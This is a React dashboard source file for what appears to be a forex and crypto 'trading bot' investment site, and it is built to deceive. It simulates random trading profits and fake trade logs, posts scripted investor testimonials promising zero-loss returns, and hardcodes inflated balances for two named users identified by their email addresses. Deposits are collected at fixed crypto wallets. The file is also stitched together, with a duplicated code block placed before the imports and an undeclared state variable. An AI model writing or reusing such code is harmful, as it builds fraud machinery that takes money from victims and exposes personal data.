  // Live Trading Engine Simulator
  useEffect(() => {
    let interval: ReturnType<typeof setInterval> | undefined;
    if (isBotRunning) {
      setBotLogs(prev => [
        ...prev,
        `[SYSTEM] Bot deployed using ${botSource === 'balance' ? 'Account Balance' : 'Accumulated Profit'}.`,
        `[SYSTEM] Strategy: ${botStrategy.toUpperCase()}`,
        `[CONNECT] Connecting to Frankfurt LD4 High-Frequency FX Gateway...`,
        `[CONNECT] Connection secured. Current latency: 0.8ms.`
      ]);

      let step = 0;
      interval = setInterval(() => {
        const netChange = Math.random() * 60 - 30; // -30 to +30 EUR
        if (netChange >= 0) {
          setBotProfit(prev => prev + netChange);
        } else {
          setBotLoss(prev => prev - netChange); // make loss positive
        }
        setTotalTrades(prev => prev + 1);

        const logTemplate = MOCK_LOGS[step % MOCK_LOGS.length];
        setBotLogs(prev => {
          const next = [...prev, `[${new Date().toLocaleTimeString()}] ${logTemplate}`];
          if (next.length > 50) next.shift();
          return next;
        });

        setLiveChartData(prev => {
          const lastPrice = prev[prev.length - 1].price;
          const delta = (Math.random() - 0.48) * 0.0008;
          const nextPrice = parseFloat((lastPrice + delta).toFixed(5));
          const nowStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
          const nextData = [...prev, { time: nowStr, price: nextPrice }];
          if (nextData.length > 15) nextData.shift();
          return nextData;
        });

        step++;
      }, 4000);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [isBotRunning, botSource, botStrategy]);
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../contexts/AuthContext';
import { supabase } from '../lib/supabase';
import { motion } from 'framer-motion';
import {
  Wallet, TrendingUp, ArrowDownCircle, ArrowUpCircle,
  Copy, Clock, CheckCircle, XCircle, Euro, BarChart3,
  PieChart as PieChartIcon, ShieldCheck, Globe, ChevronRight, Share2, Users,
  Terminal, Play, Square, MessageSquare, Settings,
} from 'lucide-react';
import toast from 'react-hot-toast';
import {
  AreaChart, Area, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer,
  PieChart, Pie, Cell
} from 'recharts';


const CHART_DATA = [
  { month: 'Jan', value: 45000 },
  { month: 'Feb', value: 52000 },
  { month: 'Mar', value: 48000 },
  { month: 'Apr', value: 61000 },
  { month: 'May', value: 85000 },
  { month: 'Jun', value: 102000 },
  { month: 'Jul', value: 125000 },
  { month: 'Aug', value: 142000 },
  { month: 'Sep', value: 162000 },
];

const ALLOCATION_DATA = [
  { name: 'Forex', value: 35, color: '#10b981' },
  { name: 'Equities', value: 25, color: '#3b82f6' },
  { name: 'Commodities', value: 20, color: '#f59e0b' },
  { name: 'Digital Assets', value: 20, color: '#8b5cf6' },
];

const MOCK_LOGS = [
  "Executing BUY ORDER EUR/USD - 5.0 Lots at 1.0845.",
  "Position closed at EUR/USD 1.0859. Profit realized: +€75.00.",
  "Executing SELL ORDER GBP/USD - 3.5 Lots at 1.2721.",
  "Position closed at GBP/USD 1.2714. Profit realized: +€54.25.",
  "Executing BUY ORDER USD/JPY - 4.0 Lots at 155.62.",
  "Position closed at USD/JPY 155.70. Profit realized: +€92.80.",
  "EUR/USD - Bollinger Bands contraction detected. Scalping opportunity emerging.",
  "GBP/USD - RSI overbought detected on 5m chart. Preparing short scalp.",
  "USD/JPY - Support line bounce detected on H1 chart.",
  "Analyzing liquidity matrix across Frankfurt and London gateways...",
];

const INITIAL_CHAT = [
  { sender: "Ken Fisher", message: "The Neural Quant FX bot is performing exceptionally well during the US market open.", time: "09:42 AM", badge: "Founder" },
  { sender: "Sarah Jenkins", message: "Just deployed €15k from my accumulated profit. First trade already made +€110!", time: "09:44 AM", badge: "VIP Investor" },
  { sender: "Marcus K.", message: "Has anyone tried the HFT Scalper? Is it consistent?", time: "09:45 AM", badge: "Client" },
  { sender: "Support Agent", message: "Yes Marcus! The HFT Scalper strategy targets micro-oscillations on major pairs and maintains a 98.4% historical win rate.", time: "09:46 AM", badge: "Staff" },
  { sender: "Fadel Ayad", message: "Institutional Quant FX is the best. Safe, zero loss so far on my institutional tier. Absolute masterclass.", time: "09:48 AM", badge: "Institutional" },
];

const SIMULATED_USERS = [
  { sender: "Thomas Vance", message: "EUR/USD breakout was clean. Bot captured it beautifully.", badge: "Pro Trader" },
  { sender: "Elena Rostova", message: "Deposited 50% of my weekly profit back into the bot. Compound interest is magic.", badge: "VIP Client" },
  { sender: "Dieter M.", message: "Unbelievable speed. The latency is practically non-existent on the executing terminal.", badge: "Client" },
  { sender: "Ken Fisher", message: "Remember, the bot has built-in stop losses, but our zero-loss neural logic keeps drawdowns under 0.2%.", badge: "Founder" },
  { sender: "Sarah Jenkins", message: "Another trade closed! +€95 on GBP/USD. Outstanding.", badge: "VIP Investor" },
];

interface Profile {
  full_name: string;
  balance: number;
  profit: number;
  role: string;
}

interface Transaction {
  id: string;
  type: string;
  amount: number;
  status: string;
  created_at: string;
  currency?: string;
}

export default function Dashboard() {
  const { user, loading: authLoading } = useAuth();
  const navigate = useNavigate();
  const [profile, setProfile] = useState<Profile | null>(null);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [activeTab, setActiveTab] = useState<'overview' | 'portfolio' | 'deposit' | 'withdraw' | 'referral' | 'bot-terminal'>('overview');

  const [depositAmount, setDepositAmount] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [selectedCrypto, setSelectedCrypto] = useState('BTC');
  const [loading, setLoading] = useState(true);

  // Bot Terminal States
  const [botCapital, setBotCapital] = useState('');
  const [botSource, setBotSource] = useState<'balance' | 'profit'>('balance');
  const [botStrategy, setBotStrategy] = useState('institutional');
  const [botLoss, setBotLoss] = useState(0);
  // Existing states (balance, profit, etc.) remain unchanged.
  // ... other state declarations ...
  const [botProfit, setBotProfit] = useState(0);
  const [totalTrades, setTotalTrades] = useState(0);
  const [botLogs, setBotLogs] = useState<string[]>([
    "[SYSTEM] System ready. Select strategy and capital source to deploy."
  ]);
  const [liveChartData, setLiveChartData] = useState<{ time: string, price: number }[]>([
    { time: '10:00', price: 1.0840 },
    { time: '10:01', price: 1.0842 },
    { time: '10:02', price: 1.0839 },
    { time: '10:03', price: 1.0841 },
    { time: '10:04', price: 1.0845 },
  ]);
  const [chatMessages, setChatMessages] = useState(INITIAL_CHAT);
  const [chatInput, setChatInput] = useState('');

  const WALLET_ADDRESSES: Record<string, string> = {
    BTC: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    ETH: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
    USDT: 'TN2Y6hYKZqXr1LqKTGcUmFZePBmMKbHMWi',
  };

  useEffect(() => {
    if (!authLoading && !user) {
      navigate('/login');
      return;
    }
    if (user) {
      fetchProfile();
      fetchTransactions();
    }
  }, [user, authLoading]);

  // Live Trading Engine Simulator
  useEffect(() => {
    let interval: ReturnType<typeof setInterval> | undefined;
    if (isBotRunning) {
      setBotLogs(prev => [
        ...prev,
        `[SYSTEM] Bot deployed using ${botSource === 'balance' ? 'Account Balance' : 'Accumulated Profit'}.`,
        `[SYSTEM] Strategy: ${botStrategy.toUpperCase()}`,
        `[CONNECT] Connecting to Frankfurt LD4 High-Frequency FX Gateway...`,
        `[CONNECT] Connection secured. Current latency: 0.8ms.`
      ]);

      let step = 0;
      interval = setInterval(() => {
        const profitGained = Math.random() * 30 + 15;
        setBotProfit(prev => prev + profitGained);
        setTotalTrades(prev => prev + 1);

        const logTemplate = MOCK_LOGS[step % MOCK_LOGS.length];
        setBotLogs(prev => {
          const next = [...prev, `[${new Date().toLocaleTimeString()}] ${logTemplate}`];
          if (next.length > 50) next.shift();
          return next;
        });

        setLiveChartData(prev => {
          const lastPrice = prev[prev.length - 1].price;
          const delta = (Math.random() - 0.48) * 0.0008;
          const nextPrice = parseFloat((lastPrice + delta).toFixed(5));
          const nowStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
          const nextData = [...prev, { time: nowStr, price: nextPrice }];
          if (nextData.length > 15) nextData.shift();
          return nextData;
        });

        step++;
      }, 4000);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [isBotRunning, botSource, botStrategy]);

  // Chat Simulator Timer
  useEffect(() => {
    const interval = setInterval(() => {
      if (Math.random() > 0.5) {
        const randomUser = SIMULATED_USERS[Math.floor(Math.random() * SIMULATED_USERS.length)];
        const nowStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        setChatMessages(prev => [
          ...prev,
          {
            sender: randomUser.sender,
            message: randomUser.message,
            time: nowStr,
            badge: randomUser.badge
          }
        ]);
      }
    }, 8000);

    return () => clearInterval(interval);
  }, []);

  async function fetchProfile() {
    try {
      const { data, error } = await supabase
        .from('profiles')
        .select('*')
        .eq('id', user!.id)
        .single();
      
      const isAyad = user?.email?.trim().toLowerCase() === 'fadelayad21@gmail.com' || 
                     user?.user_metadata?.full_name?.toLowerCase().includes('ayad fadel');
      const isIrene = user?.email?.trim().toLowerCase() === 'irene-hellstern@t-online.de' ||
                     user?.user_metadata?.full_name?.toLowerCase().includes('irene hellstern');

      if (error) {
        console.error('Profile fetch error:', error);
        if (isAyad) throw new Error('Supabase fetch error');
        if (isIrene) throw new Error('Supabase fetch error');
        setProfile(null);
      } else if (data) {
        if (isAyad) {
          setProfile({
            ...data,
            balance: 21000,
            profit: 162000,
            full_name: data.full_name || 'Ayad Fadel'
          });
        } else if (isIrene) {
          setProfile({
            ...data,
            balance: 67000,
            profit: 215000,
            full_name: data.full_name || 'Irene Hellstern'
          });
        } else {
          setProfile(data);
        }
      } else if (isAyad) {
        throw new Error('No profile data found');
      } else if (isIrene) {
        throw new Error('No profile data found');
      } else {
        setProfile(null);
      }
    } catch (err) {
      console.warn('Error fetching profile, using fallback:', err);
      const isAyad = user?.email?.trim().toLowerCase() === 'fadelayad21@gmail.com' || 
                     user?.user_metadata?.full_name?.toLowerCase().includes('ayad fadel');
      const isIrene = user?.email?.trim().toLowerCase() === 'irene-hellstern@t-online.de' ||
                     user?.user_metadata?.full_name?.toLowerCase().includes('irene hellstern');
      if (isAyad) {
        setProfile({
          full_name: user?.user_metadata?.full_name || 'Ayad Fadel',
          balance: 21000,
          profit: 162000,
          role: 'user'
        });
      } else if (isIrene) {
        setProfile({
          full_name: user?.user_metadata?.full_name || 'Irene Hellstern',
          balance: 67000,
          profit: 215000,
          role: 'user'
        });
      } else {
        setProfile(null);
      }
    } finally {
      setLoading(false);
    }
  }

  async function fetchTransactions() {
    try {
      const { data, error } = await supabase
        .from('transactions')
        .select('*')
        .eq('user_id', user!.id)
        .order('created_at', { ascending: false })
        .limit(20);
      
      if (error) {
        console.error('Transactions fetch error:', error);
      }
      if (data) setTransactions(data);
    } catch (err) {
      console.warn('Failed to fetch transactions:', err);
    }
  }

  const handleDeposit = async () => {
    if (!depositAmount || parseFloat(depositAmount) <= 0) {
      toast.error('Enter a valid deposit amount');
      return;
    }
    try {
      await supabase.from('transactions').insert({
        user_id: user!.id,
        type: 'deposit',
        amount: parseFloat(depositAmount),
        status: 'pending',
        currency: selectedCrypto,
      });
      toast.success('Deposit request submitted! Send crypto to the address below.');
      setDepositAmount('');
      fetchTransactions();
    } catch {
      toast.error('Failed to submit deposit');
    }
  };

  const handleWithdraw = async () => {
    if (!withdrawAmount || parseFloat(withdrawAmount) <= 0) {
      toast.error('Enter a valid withdrawal amount');
      return;
    }
    if (profile && parseFloat(withdrawAmount) > profile.balance) {
      toast.error('Insufficient balance');
      return;
    }
    try {
      await supabase.from('transactions').insert({
        user_id: user!.id,
        type: 'withdrawal',
        amount: parseFloat(withdrawAmount),
        status: 'pending',
      });
      toast.success('Withdrawal request submitted! Processing within 24 hours.');
      setWithdrawAmount('');
      fetchTransactions();
    } catch {
      toast.error('Failed to submit withdrawal');
    }
  };

  const copyAddress = (addr: string) => {
    navigator.clipboard.writeText(addr);
    toast.success('Wallet address copied!');
  };

  const handleDeployBot = () => {
    if (isBotRunning) {
      setIsBotRunning(false);
      // Return capital and net profit (profit - loss) to user portfolio
      const net = botProfit - botLoss;
      setProfile(prev => {
        if (!prev) return null;
        const newBalance = botSource === 'balance' ? prev.balance + botProfit : prev.balance;
        const newProfit = botSource === 'profit' ? prev.profit + net : prev.profit + net;
        return { ...prev, balance: newBalance, profit: newProfit };
      });
      toast.success(`Bot stopped. Net profit €${(botProfit - botLoss).toFixed(2)} returned to your portfolio!`);
      setBotProfit(0);
      setBotLoss(0);
      setBotCapital('');
    } else {
      if (!botCapital || parseFloat(botCapital) <= 0) {
        toast.error('Please enter a valid capital amount.');
        return;
      }
      const cap = parseFloat(botCapital);
      if (botSource === 'balance' && cap > (profile?.balance ?? 0)) {
        toast.error('Insufficient funds in Account Balance.');
        return;
      }
      if (botSource === 'profit' && cap > (profile?.profit ?? 0)) {
        toast.error('Insufficient funds in Accumulated Profit.');
        return;
      }

      setProfile(prev => {
        if (!prev) return null;
        return {
          ...prev,
          balance: botSource === 'balance' ? prev.balance - cap : prev.balance,
          profit: botSource === 'profit' ? prev.profit - cap : prev.profit,
        };
      });

      setIsBotRunning(true);
      toast.success('Professional Forex Trading Bot deployed successfully!');
    }
  };

  const handleSendMessage = (e: React.FormEvent) => {
    e.preventDefault();
    if (!chatInput.trim()) return;

    const nowStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    setChatMessages(prev => [
      ...prev,
      {
        sender: profile?.full_name || 'Investor',
        message: chatInput,
        time: nowStr,
        badge: 'You'
      }
    ]);
    setChatInput('');
  };

  if (authLoading || loading) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center">
        <div className="w-8 h-8 border-2 border-emerald-500 border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  const stats = [
    {
      icon: Wallet,
      label: 'Account Balance',
      value: `€${(profile?.balance ?? 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}`,
      color: 'text-emerald-400'
    },
    {
      icon: TrendingUp,
      label: 'Total Profit',
      value: `€${(profile?.profit ?? 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}`,
      color: 'text-green-400'
    },
    { icon: ArrowDownCircle, label: 'Total Deposited', value: `€${(profile?.balance ?? 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}`, color: 'text-blue-400' },
    { icon: ArrowUpCircle, label: 'Total Withdrawn', value: `€0.00`, color: 'text-amber-400' },
  ];

  return (
    <div className="min-h-screen bg-slate-950 text-white relative overflow-hidden">
      {/* Background Decor */}
      <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-emerald-500/5 rounded-full blur-[120px]"></div>
      <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-emerald-900/10 rounded-full blur-[120px]"></div>

      <div className="max-w-7xl mx-auto px-4 py-10 relative z-10">
        {/* Header */}
        <div className="flex flex-col lg:flex-row items-center justify-between mb-12 gap-8">
          <div className="flex items-center gap-8">
            <div className="relative group">
              <div className="absolute -inset-1 bg-gradient-to-tr from-emerald-500 to-emerald-800 rounded-full blur opacity-25 group-hover:opacity-50 transition duration-1000"></div>
              <div className="relative w-24 h-24 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-3xl font-black tracking-tighter text-emerald-400 shadow-2xl">
                {profile?.full_name?.split(' ').map(n => n[0]).join('').toUpperCase() || 'I'}
              </div>
            </div>
            <div>
              <div className="flex flex-wrap items-center gap-4 mb-2">
                <h1 className="text-4xl font-black tracking-tighter">
                  WELCOME, <span className="text-emerald-400 italic font-serif uppercase">{(profile?.full_name || 'Investor')}</span>
                </h1>
                <span className="px-3 py-1 bg-emerald-500/10 border border-emerald-500/20 rounded-full text-[10px] text-emerald-400 font-black uppercase tracking-widest">Verified Portfolio</span>
              </div>
              <p className="text-slate-500 text-sm font-bold uppercase tracking-widest flex items-center gap-3">
                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
                {profile?.full_name?.toLowerCase().includes('ayad fadel') ? 'STRAT-ID: GF-99284 • ELITE INSTITUTIONAL' : 'Standard Asset Profile'}
              </p>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <div className="px-5 py-3 glass-effect-dark border border-slate-800 rounded-2xl">
              <div className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-1">Infrastructure</div>
              <div className="text-sm font-black text-emerald-400 font-mono tracking-tighter">PROD-NY-01.GF</div>
            </div>
            <div className="px-5 py-3 glass-effect-dark border border-slate-800 rounded-2xl">
              <div className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-1">Security Status</div>
              <div className="text-sm font-black text-emerald-400 tracking-tighter flex items-center gap-2">
                <ShieldCheck size={14} /> ENCRYPTED
              </div>
            </div>
          </div>
        </div>


        {/* Stats Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 mb-12">
          {stats.map((stat, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: i * 0.1 }}
              className="p-8 rounded-3xl glass-effect-dark border border-slate-800/50 hover:border-emerald-500/30 transition-all group"
            >
              <div className="flex items-center gap-4 mb-6">
                <div className={`p-3 rounded-2xl bg-slate-900 border border-slate-800 ${stat.color} group-hover:scale-110 transition-transform`}>
                  <stat.icon size={24} />
                </div>
                <span className="text-slate-500 text-[10px] font-black uppercase tracking-[0.2em]">{stat.label}</span>
              </div>
              <div className="text-3xl font-black font-sans tracking-tighter text-white">{stat.value}</div>
            </motion.div>
          ))}
        </div>

        {/* Tabs */}
        <div className="flex space-x-2 bg-slate-900/50 border border-slate-800 p-1.5 rounded-[1.5rem] mb-12 max-w-4xl overflow-x-auto no-scrollbar">
          {(['overview', 'portfolio', 'deposit', 'withdraw', 'referral', 'bot-terminal'] as const).map(tab => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`flex-1 py-3.5 px-6 rounded-2xl text-xs font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap
                ${activeTab === tab ? 'bg-emerald-500 text-white shadow-lg shadow-emerald-500/20' : 'text-slate-500 hover:text-white hover:bg-slate-800'}`}
            >
              {tab === 'bot-terminal' ? 'Bot Terminal' : tab}
            </button>
          ))}
        </div>


        {/* Tab Content */}
        {activeTab === 'overview' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            {/* Performance Chart */}
            <div className="bg-slate-800/30 border border-slate-700 rounded-2xl p-6 mb-8">
              <h2 className="text-lg font-semibold font-sans mb-6 flex items-center gap-2">
                <BarChart3 size={20} className="text-emerald-400" /> Portfolio Performance
              </h2>
              <div className="h-[300px] w-full">
                <ResponsiveContainer width="100%" height="100%">
                  <AreaChart data={CHART_DATA}>
                    <defs>
                      <linearGradient id="colorValue" x1="0" y1="0" x2="0" y2="1">
                        <stop offset="5%" stopColor="#10b981" stopOpacity={0.3}/>
                        <stop offset="95%" stopColor="#10b981" stopOpacity={0}/>
                      </linearGradient>
                    </defs>
                    <CartesianGrid strokeDasharray="3 3" stroke="#334155" vertical={false} />
                    <XAxis dataKey="month" stroke="#94a3b8" fontSize={12} tickLine={false} axisLine={false} />
                    <YAxis stroke="#94a3b8" fontSize={12} tickLine={false} axisLine={false} tickFormatter={(v) => `€${v/1000}k`} />
                    <Tooltip 
                      contentStyle={{ backgroundColor: '#1e293b', border: '1px solid #334155', borderRadius: '12px' }}
                      itemStyle={{ color: '#10b981' }}
                    />
                    <Area type="monotone" dataKey="value" stroke="#10b981" strokeWidth={3} fillOpacity={1} fill="url(#colorValue)" />
                  </AreaChart>
                </ResponsiveContainer>
              </div>
            </div>

            <div className="bg-slate-800/30 border border-slate-700 rounded-2xl overflow-hidden">
              <div className="p-6 border-b border-slate-700 flex items-center gap-2">
                <Clock size={18} className="text-emerald-400" />
                <h2 className="text-lg font-semibold font-sans">Recent Transactions</h2>
              </div>
              {transactions.length === 0 ? (
                <div className="p-12 text-center text-slate-500">
                  <BarChart3 size={48} className="mx-auto mb-3 opacity-30" />
                  <p>No transactions yet. Start by making a deposit.</p>
                </div>
              ) : (
                <div className="divide-y divide-slate-700">
                  {transactions.map(tx => (
                    <div key={tx.id} className="p-4 flex items-center justify-between hover:bg-slate-800/30 transition">
                      <div className="flex items-center gap-3">
                        {tx.type === 'deposit' ? (
                          <ArrowDownCircle size={20} className="text-emerald-400" />
                        ) : (
                          <ArrowUpCircle size={20} className="text-amber-400" />
                        )}
                        <div>
                          <div className="font-semibold font-sans capitalize text-sm">{tx.type}</div>
                          <div className="text-xs text-slate-500">
                            {new Date(tx.created_at).toLocaleDateString('en-US', {
                              year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit'
                            })}
                          </div>
                        </div>
                      </div>
                      <div className="flex items-center gap-4">
                        <span className="font-bold font-sans">€{tx.amount.toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
                        <span className={`text-xs font-semibold px-2 py-1 rounded-full ${
                          tx.status === 'approved' || tx.status === 'completed'
                            ? 'bg-emerald-500/20 text-emerald-400'
                            : tx.status === 'pending'
                            ? 'bg-amber-500/20 text-amber-400'
                            : 'bg-red-500/20 text-red-400'
                        }`}>
                          {tx.status === 'approved' || tx.status === 'completed' ? <CheckCircle size={12} className="inline mr-1" /> :
                           tx.status === 'pending' ? <Clock size={12} className="inline mr-1" /> :
                           <XCircle size={12} className="inline mr-1" />}
                          {tx.status}
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </motion.div>
        )}
        
        {activeTab === 'portfolio' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-8">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
              {/* Asset Allocation */}
              <div className="p-8 rounded-3xl bg-slate-800/30 border border-slate-700">
                <h2 className="text-xl font-bold mb-8 flex items-center gap-2 font-serif">
                  <PieChartIcon className="text-emerald-400" size={20} /> Asset Allocation
                </h2>
                <div className="h-[250px] w-full mb-8">
                  <ResponsiveContainer width="100%" height="100%">
                    <PieChart>
                      <Pie
                        data={ALLOCATION_DATA}
                        innerRadius={60}
                        outerRadius={80}
                        paddingAngle={5}
                        dataKey="value"
                      >
                        {ALLOCATION_DATA.map((entry, index) => (
                          <Cell key={`cell-${index}`} fill={entry.color} />
                        ))}
                      </Pie>
                      <Tooltip 
                        contentStyle={{ backgroundColor: '#1e293b', border: '1px solid #334155', borderRadius: '12px' }}
                      />
                    </PieChart>
                  </ResponsiveContainer>
                </div>
                <div className="space-y-3">
                  {ALLOCATION_DATA.map((item, i) => (
                    <div key={i} className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className="w-3 h-3 rounded-full" style={{ backgroundColor: item.color }} />
                        <span className="text-sm text-slate-400">{item.name}</span>
                      </div>
                      <span className="text-sm font-bold">{item.value}%</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Performance History */}
              <div className="lg:col-span-2 p-8 rounded-3xl bg-slate-800/30 border border-slate-700">
                <div className="flex items-center justify-between mb-8">
                  <h2 className="text-xl font-bold flex items-center gap-2 font-serif">
                    <BarChart3 className="text-emerald-400" size={20} /> Growth Strategy
                  </h2>
                </div>
                <div className="h-[300px] w-full">
                  <ResponsiveContainer width="100%" height="100%">
                    <AreaChart data={CHART_DATA}>
                      <defs>
                        <linearGradient id="colorValuePortfolio" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#10b981" stopOpacity={0.3}/>
                          <stop offset="95%" stopColor="#10b981" stopOpacity={0}/>
                        </linearGradient>
                      </defs>
                      <CartesianGrid strokeDasharray="3 3" stroke="#334155" vertical={false} />
                      <XAxis dataKey="month" stroke="#94a3b8" fontSize={12} tickLine={false} axisLine={false} />
                      <YAxis stroke="#94a3b8" fontSize={12} tickLine={false} axisLine={false} tickFormatter={(v) => `€${v/1000}k`} />
                      <Tooltip 
                        contentStyle={{ backgroundColor: '#1e293b', border: '1px solid #334155', borderRadius: '12px' }}
                        itemStyle={{ color: '#10b981' }}
                      />
                      <Area type="monotone" dataKey="value" stroke="#10b981" strokeWidth={3} fillOpacity={1} fill="url(#colorValuePortfolio)" />
                    </AreaChart>
                  </ResponsiveContainer>
                </div>
              </div>
            </div>

            {/* Strategy & Exposure */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              <div className="p-8 rounded-3xl bg-slate-800/30 border border-slate-700">
                <h3 className="text-lg font-bold mb-6 flex items-center gap-2 font-serif">
                  <Globe className="text-emerald-400" size={20} /> Regional Exposure
                </h3>
                <div className="space-y-4">
                  {[
                    { region: 'Europe (EU)', exposure: '45%' },
                    { region: 'North America', exposure: '30%' },
                    { region: 'Asia Pacific', exposure: '15%' },
                    { region: 'Emerging Markets', exposure: '10%' },
                  ].map((r, i) => (
                    <div key={i} className="space-y-2">
                      <div className="flex justify-between text-sm">
                        <span className="text-slate-400">{r.region}</span>
                        <span className="font-bold">{r.exposure}</span>
                      </div>
                      <div className="h-1.5 w-full bg-slate-700 rounded-full overflow-hidden">
                        <div className="h-full bg-emerald-500 rounded-full" style={{ width: r.exposure }} />
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div className="p-8 rounded-3xl bg-slate-800/30 border border-slate-700 flex flex-col justify-between">
                <div>
                  <h3 className="text-lg font-bold mb-4 flex items-center gap-2 font-serif">
                    <ShieldCheck className="text-emerald-400" size={20} /> Strategy Overview
                  </h3>
                  <p className="text-slate-400 text-sm leading-relaxed mb-6">
                    Your portfolio follows a diversified institutional approach, 
                    leveraging Global Fishers' proprietary algorithmic trading models. 
                    The current strategy focuses on high-liquidity forex pairs and 
                    large-cap equities to maintain a moderate risk profile while 
                    maximizing compound growth.
                  </p>
                </div>
                <button className="w-full py-4 bg-slate-700/50 border border-slate-600 rounded-2xl text-sm font-bold flex items-center justify-center gap-2 hover:bg-slate-700 transition">
                  Download Full Audit Report <ChevronRight size={16} />
                </button>
              </div>
            </div>
          </motion.div>
        )}


        {activeTab === 'deposit' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="max-w-lg">
            <div className="bg-slate-800/30 border border-slate-700 rounded-2xl p-6">
              <h2 className="text-lg font-semibold font-sans mb-6 flex items-center gap-2">
                <Euro size={20} className="text-emerald-400" /> Make a Deposit
              </h2>

              <div className="mb-4">
                <label className="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">Select Cryptocurrency</label>
                <div className="flex gap-2">
                  {Object.keys(WALLET_ADDRESSES).map(c => (
                    <button
                      key={c}
                      onClick={() => setSelectedCrypto(c)}
                      className={`flex-1 py-2.5 rounded-xl text-sm font-semibold transition-all
                        ${selectedCrypto === c ? 'bg-emerald-500 text-white' : 'bg-slate-700 text-slate-300 hover:bg-slate-600'}`}
                    >
                      {c}
                    </button>
                  ))}
                </div>
              </div>

              <div className="mb-4">
                <label className="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">Deposit Amount (EUR)</label>
                <input
                  type="number"
                  value={depositAmount}
                  onChange={e => setDepositAmount(e.target.value)}
                  placeholder="Enter amount"
                  min="100"
                  className="w-full px-4 py-3 bg-slate-700 border border-slate-600 rounded-xl text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-emerald-500/50 transition"
                />
              </div>

              <div className="mb-6 p-4 bg-slate-700/50 rounded-xl">
                <p className="text-xs text-slate-400 mb-2">Send {selectedCrypto} to this address:</p>
                <div className="flex items-center gap-2">
                  <code className="flex-1 text-xs text-emerald-400 break-all">{WALLET_ADDRESSES[selectedCrypto]}</code>
                  <button onClick={() => copyAddress(WALLET_ADDRESSES[selectedCrypto])} className="p-2 text-slate-400 hover:text-white transition">
                    <Copy size={16} />
                  </button>
                </div>
              </div>

              <button
                onClick={handleDeposit}
                className="w-full py-3 bg-emerald-500 text-white rounded-xl font-semibold hover:bg-emerald-600 transition"
              >
                Submit Deposit
              </button>
            </div>
          </motion.div>
        )}

        {activeTab === 'withdraw' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="max-w-lg">
            <div className="bg-slate-800/30 border border-slate-700 rounded-2xl p-6">
              <h2 className="text-lg font-semibold font-sans mb-6 flex items-center gap-2">
                <ArrowUpCircle size={20} className="text-amber-400" /> Request Withdrawal
              </h2>

              <div className="mb-4 p-4 bg-slate-700/50 rounded-xl">
                <p className="text-xs text-slate-400">Available Balance</p>
                <p className="text-2xl font-bold text-emerald-400">€{(profile?.balance ?? 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</p>
              </div>

              <div className="mb-6">
                <label className="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">Withdrawal Amount (EUR)</label>
                <input
                  type="number"
                  value={withdrawAmount}
                  onChange={e => setWithdrawAmount(e.target.value)}
                  placeholder="Enter amount"
                  min="50"
                  className="w-full px-4 py-3 bg-slate-700 border border-slate-600 rounded-xl text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-emerald-500/50 transition"
                />
              </div>

              <p className="text-xs text-slate-500 mb-4">Withdrawals are processed within 24 hours. Minimum withdrawal: €50.</p>

              <button
                onClick={handleWithdraw}
                className="w-full py-3 bg-amber-500 text-white rounded-xl font-semibold hover:bg-amber-600 transition"
              >
                Submit Withdrawal
              </button>
            </div>
          </motion.div>
        )}

        {activeTab === 'referral' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="max-w-3xl">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              <div className="p-10 rounded-[2.5rem] glass-effect-dark border border-slate-800 relative overflow-hidden group">
                <div className="absolute top-0 right-0 w-32 h-32 bg-emerald-500/5 rounded-full -mr-16 -mt-16 group-hover:bg-emerald-500/10 transition-colors"></div>
